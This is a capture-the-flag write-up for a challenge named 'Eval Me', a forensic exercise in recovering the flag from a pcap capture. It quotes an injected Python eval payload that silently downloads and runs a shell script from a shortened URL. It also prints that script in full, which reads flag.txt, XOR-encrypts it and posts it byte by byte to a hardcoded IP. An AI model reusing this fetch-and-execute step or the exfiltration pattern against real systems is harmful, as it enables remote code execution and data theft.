### Eval Me
I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?
nc chals.sekai.team 9000

Author: Guesslemonger
---
Given File: [capture.pcapng](capture.pcapng)

The interesting traffic in this capture seems to be the numbers that the user is sending to the server. Based on the fact that the server given seems to ask for the user to calculate random equations, we could assume that these are the answers to those equations. Although, the data does seem to be in hex. 

Regardless, when we pull out all the data using `strings capture.pcapng | grep '{"data":' | cut -c 10-11` we get 
`20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f`

For now we can't do anything with this so lets investigate the netcat that was given in the challenge description. Upon connecting we are told that this is a simple intro to pwntool challenge where we must solve 100 equations in a time limit to get the flag. For this, I slightly modified the script from this writeup https://ctfwriteups.trwbox.com/competitions/SnykConCTF/Calculator/ to end up with 
[solver.py](solver.py)
This solves the equations nicely until we get an error with output 
```__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell
Traceback (most recent call last):
  File "/home/kali/Downloads/solver.py", line 34, in <module>
    eq1 = eval(stringEquation)
          ^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1
    __import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell
                                         ^
SyntaxError: '(' was never closed
```
Strange. If we also run the curl command we end up downloading the following script:
```
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```
This is the point where it was getting late (roughly 20 minutes until CTF ended) and I just gave chatgpt my previous hex values found from the pcap and this script and it gave me this script to reverse the XOR with:
```
ENCRYPTED="20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f"
KEY='s3k@1_v3ry_w0w'

# Convert encrypted string to an array of bytes
IFS=" " read -ra BYTE_ARRAY <<< "$ENCRYPTED"

DECRYPTED=""
for ((i = 0; i < ${#BYTE_ARRAY[@]}; i++)); do
    BYTE=${BYTE_ARRAY[i]}
    KEY_BYTE=${KEY:$((i % ${#KEY})):1}  # Obtain the corresponding key byte
    DECRYPTED_BYTE=$((0x$BYTE ^ $(printf '%d' "'$KEY_BYTE")))  # XOR operation
    DECRYPTED+="\\x$(printf '%02x' "$DECRYPTED_BYTE")"  # Convert back to ASCII
done

echo -e "$DECRYPTED"
```
running this script gave me the flag of `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
